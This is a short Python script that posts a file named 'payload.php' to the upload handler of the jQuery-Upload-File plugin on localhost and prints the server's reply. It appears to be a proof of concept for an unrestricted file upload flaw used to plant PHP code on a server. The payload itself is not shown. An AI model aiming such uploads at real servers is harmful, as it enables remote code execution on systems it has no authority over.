import requests 

fileName = 'payload.php'
files = { 'myfile' : open(fileName, 'rb') }
data = {}

response = requests.post('//localhost/jQuery-Upload-File-master/php/upload.php', data=data, files=files)

print(response.text) 